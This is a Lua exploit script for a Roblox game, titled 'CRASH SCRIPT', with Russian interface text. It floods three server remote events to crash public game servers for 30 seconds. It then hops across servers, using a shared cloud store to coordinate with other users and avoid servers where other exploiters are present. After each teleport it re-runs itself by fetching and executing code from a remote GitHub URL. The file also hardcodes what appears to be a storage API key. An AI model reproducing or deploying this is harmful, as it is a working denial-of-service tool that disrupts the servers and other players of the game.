local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local GAME_ID = 11451679682
if game.PlaceId ~= GAME_ID then return end

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

local PlaceId = game.PlaceId
local CurrentJobId = game.JobId

local CONFIG = {
    JSONBinID = "6aa56f96ac6210605ac505f9",
    JSONBinKey = "$2a$10$RSaoIuwX6FQOeNS61UW3eegXc8kmdCmN8/PsUHblaPvRinh/I6fFu",

    PantryID = "f4e76f34-ce27-4bb9-9608-d0e85590bd84",
    PantryBasket = "my-new-basket-name",

    MinPlayers = 1,
    MaxPlayers = 25,
    MaxPages = 6,
    CacheMaxAgeMinutes = 120,
    LockTTL = 180,
    ScriptURL = "https://raw.githubusercontent.com/2422-hue/-/main/kejss.lua",
}

local queue_on_teleport = (syn and syn.queue_on_teleport)
    or queue_on_teleport
    or (fluxus and fluxus.queue_on_teleport)
    or (getgenv() and getgenv().queue_on_teleport)

local REEXECUTE = string.format([[
    loadstring(game:HttpGet("%s"))()
]], CONFIG.ScriptURL)

if queue_on_teleport then
    queue_on_teleport(REEXECUTE)
end

local function httpRequest(opts)
    local req = (syn and syn.request) or (http and http.request) or request or http_request
    if not req then return nil end
    local ok, res = pcall(req, opts)
    if not ok then return nil end
    return res
end

local function encode(t)
    local ok, r = pcall(HttpService.JSONEncode, HttpService, t)
    return ok and r or nil
end

local function decode(s)
    local ok, r = pcall(HttpService.JSONDecode, HttpService, s)
    return ok and r or nil
end

local function sharedRead()
    local res = httpRequest({
        Url = "https://getpantry.cloud/apiv1/pantry/" .. CONFIG.PantryID .. "/basket/" .. CONFIG.PantryBasket,
        Method = "GET",
        Headers = { ["Content-Type"] = "application/json" }
    })
    if not res or res.StatusCode ~= 200 then return nil end
    local data = decode(res.Body)
    if not data then return nil end
    data._metadata = nil
    return data
end

local function sharedWrite(data)
    local res = httpRequest({
        Url = "https://getpantry.cloud/apiv1/pantry/" .. CONFIG.PantryID .. "/basket/" .. CONFIG.PantryBasket,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = encode(data)
    })
    return res and res.StatusCode == 200
end

local function pruneLocks(data)
    if not data then return nil end
    if type(data.players) ~= "table" then data.players = {} end
    local now = os.time()
    local kept = {}
    for _, entry in ipairs(data.players) do
        if type(entry) == "table" and (now - (entry.ts or 0)) < CONFIG.LockTTL then
            table.insert(kept, entry)
        end
    end
    data.players = kept
    return data
end

local function fetchServers()
    local result = {}
    local cursor = ""
    local pages = 0

    while pages < CONFIG.MaxPages do
        local url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Desc&limit=100"
        if cursor ~= "" and cursor ~= "null" then
            url = url .. "&cursor=" .. cursor
        end

        local ok, body = pcall(function()
            return game:HttpGet(url)
        end)
        if not ok or not body then break end

        local data = decode(body)
        if not data or type(data.data) ~= "table" then break end

        local fetchedThisPage = #data.data

        for _, s in ipairs(data.data) do
            local playing = tonumber(s.playing) or 0
            local id = tostring(s.id or "")
            if id ~= "" and id ~= CurrentJobId and playing >= CONFIG.MinPlayers and playing <= CONFIG.MaxPlayers then
                table.insert(result, {id = id, playing = playing})
            end
        end

        pages = pages + 1

        if fetchedThisPage < 100 then break end

        cursor = data.nextPageCursor
        if not cursor or cursor == "" or cursor == "null" then break end

        task.wait(0.3)
    end

    table.sort(result, function(a, b)
        local aIs25 = (a.playing >= CONFIG.MaxPlayers)
        local bIs25 = (b.playing >= CONFIG.MaxPlayers)
        if aIs25 ~= bIs25 then
            return not aIs25
        end
        return a.playing > b.playing
    end)
    return result
end

local function createNewQueue()
    local servers = fetchServers()
    if #servers == 0 then return nil end
    local queue = {}
    for _, s in ipairs(servers) do
        table.insert(queue, s.id)
    end
    return queue
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CrashScript"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
mainFrame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0, 30)
titleLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
titleLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
titleLabel.TextSize = 16
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Text = "CRASH SCRIPT"
titleLabel.BorderSizePixel = 1
titleLabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
titleLabel.Parent = mainFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -10, 0, 25)
statusLabel.Position = UDim2.new(0, 5, 0, 35)
statusLabel.BackgroundTransparency = 1
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.TextSize = 14
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.Text = "ПРОВЕРКА/ПОДГОТОВКА"
statusLabel.Parent = mainFrame

local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(1, -10, 0, 25)
timerLabel.Position = UDim2.new(0, 5, 0, 65)
timerLabel.BackgroundTransparency = 1
timerLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
timerLabel.TextSize = 12
timerLabel.Font = Enum.Font.Gotham
timerLabel.TextXAlignment = Enum.TextXAlignment.Center
timerLabel.Text = "Ожидание..."
timerLabel.Parent = mainFrame

local READY_JOB_ID = nil
local READY_REMAINING = 0
local ABORT_CRASH = false

local function pickRandomFree(cache)
    if type(cache.queue) ~= "table" then cache.queue = {} end
    if type(cache.players) ~= "table" then cache.players = {} end

    for i = #cache.queue, 1, -1 do
        if cache.queue[i] == CurrentJobId then
            table.remove(cache.queue, i)
        end
    end

    local locked = {}
    for _, entry in ipairs(cache.players) do
        if entry.jobId then locked[entry.jobId] = true end
    end

    local free = {}
    for _, id in ipairs(cache.queue) do
        if not locked[id] then table.insert(free, id) end
    end

    if #free == 0 then
        local newQueue = createNewQueue()
        if newQueue then
            cache.queue = newQueue
            for _, id in ipairs(newQueue) do
                if not locked[id] and id ~= CurrentJobId then
                    table.insert(free, id)
                end
            end
        end
    end

    if #free == 0 then return nil, locked end

    local pick = math.random(1, #free)
    return free[pick], locked
end

local function prepareHopInBackground()
    local when = math.random(1, 20)
    task.wait(when)

    local cache = pruneLocks(sharedRead())
    if not cache then cache = {} end

    local nextId, _ = pickRandomFree(cache)
    if not nextId then return end

    for i = #cache.queue, 1, -1 do
        if cache.queue[i] == nextId then
            table.remove(cache.queue, i)
            break
        end
    end

    table.insert(cache.players, {
        userId = player.UserId,
        name = player.Name,
        jobId = nextId,
        ts = os.time()
    })

    cache.placeId = PlaceId
    cache.updatedAt = os.time()
    sharedWrite(cache)

    READY_JOB_ID = nextId
    READY_REMAINING = #cache.queue
end

local function releaseReadyJob()
    if not READY_JOB_ID then return end
    local c = pruneLocks(sharedRead())
    if c and type(c.queue) == "table" then
        table.insert(c.queue, READY_JOB_ID)
        if type(c.players) == "table" then
            for i = #c.players, 1, -1 do
                if c.players[i].jobId == READY_JOB_ID and c.players[i].userId == player.UserId then
                    table.remove(c.players, i)
                end
            end
        end
        c.placeId = PlaceId
        c.updatedAt = os.time()
        sharedWrite(c)
    end
    READY_JOB_ID = nil
    READY_REMAINING = 0
end

local function scripterCheckInBackground()
    local cache = pruneLocks(sharedRead())
    if not cache or type(cache.players) ~= "table" then return end

    local ids = {}
    for _, entry in ipairs(cache.players) do
        if entry.userId and entry.userId ~= player.UserId then
            ids[entry.userId] = true
        end
    end

    local found = false
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player and ids[p.UserId] then
            found = true
            break
        end
    end

    if found then
        ABORT_CRASH = true
        if READY_JOB_ID then
            releaseReadyJob()
            task.spawn(prepareHopInBackground)
        end
    end
end

local function smartHop()
    statusLabel.Text = "ПОЛУЧАЮ ОЧЕРЕДЬ..."
    timerLabel.Text = "Проверяю готовый ID"

    local waitStart = os.clock()
    while not READY_JOB_ID and (os.clock() - waitStart) < 30 do
        task.wait(0.1)
    end

    if not READY_JOB_ID then
        statusLabel.Text = "НЕТ СЕРВЕРОВ"
        timerLabel.Text = "ID не был получен"
        return
    end

    statusLabel.Text = "SERVER HOP"
    timerLabel.Text = string.format("→ %s... | осталось %d",
        string.sub(READY_JOB_ID, 1, 8), READY_REMAINING)

    if queue_on_teleport then
        queue_on_teleport(REEXECUTE)
    end

    pcall(function()
        TeleportService:TeleportToPlaceInstance(PlaceId, READY_JOB_ID, player)
    end)
end

local remotes = {
    game:GetService("ReplicatedStorage"):WaitForChild("FireNull"),
    game:GetService("ReplicatedStorage"):WaitForChild("FireMissile"),
    game:GetService("ReplicatedStorage"):WaitForChild("FireGun")
}

local spamConnection = nil
local isSpamming = false

local function disableAllCollisions()
    for _, part in pairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = false
        end
    end
end

local function startMoving()
    disableAllCollisions()
    local bv = Instance.new("BodyVelocity")
    bv.Velocity = Vector3.new(300, 0, 0)
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Parent = rootPart
    humanoid.PlatformStand = true
    for _, state in ipairs({"Climbing", "FallingDown", "Flying", "Jumping", "Landed"}) do
        humanoid:SetStateEnabled(Enum.HumanoidStateType[state], false)
    end
    return bv
end

local function stopMoving(bv)
    if bv then bv:Destroy() end
    local hold = Instance.new("BodyVelocity")
    hold.Velocity = Vector3.new(0, 0, 0)
    hold.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    hold.Parent = rootPart
    return hold
end

local function startCrashSpam()
    isSpamming = true
    spamConnection = RunService.Heartbeat:Connect(function()
        if not isSpamming then
            if spamConnection then spamConnection:Disconnect() end
            return
        end
        for i = 1, 60 do
            for _, remote in pairs(remotes) do
                pcall(function() remote:FireServer() end)
            end
        end
    end)
end

local function stopCrashSpam()
    isSpamming = false
    if spamConnection then
        spamConnection:Disconnect()
        spamConnection = nil
    end
end

task.spawn(function()
    statusLabel.Text = "ЗАПУСК"
    timerLabel.Text = "Фоновые процессы пошли"

    task.spawn(prepareHopInBackground)
    task.spawn(scripterCheckInBackground)

    task.wait(1.5)

    statusLabel.Text = "УБЕГАЕМ"
    local bv = startMoving()
    local runTime = 0
    while runTime < 3 do
        runTime = runTime + RunService.Heartbeat:Wait()
        timerLabel.Text = string.format("Бежим: %.1f сек", runTime)
    end

    stopMoving(bv)

    if ABORT_CRASH then
        statusLabel.Text = "ОБНАРУЖЕН СКРИПТЕР"
        timerLabel.Text = "Хопаю без краша"
        smartHop()
        return
    end

    statusLabel.Text = "СТРЕЛЯЕМ"
    timerLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    startCrashSpam()

    local t = 30
    while t > 0 do
        if ABORT_CRASH then
            stopCrashSpam()
            statusLabel.Text = "ОБНАРУЖЕН СКРИПТЕР"
            timerLabel.Text = "Прерываю краш, хопаю"
            smartHop()
            return
        end
        local idState = READY_JOB_ID and "ID готов" or "ждём ID"
        timerLabel.Text = string.format("ХОП ЧЕРЕЗ %d СЕК | %s", t, idState)
        task.wait(1)
        t = t - 1
    end

    stopCrashSpam()
    statusLabel.Text = "КРАШ ЗАВЕРШЁН"
    timerLabel.Text = "ДЕЛАЮ SHARED HOP..."

    task.wait(0.4)
    smartHop()
end)
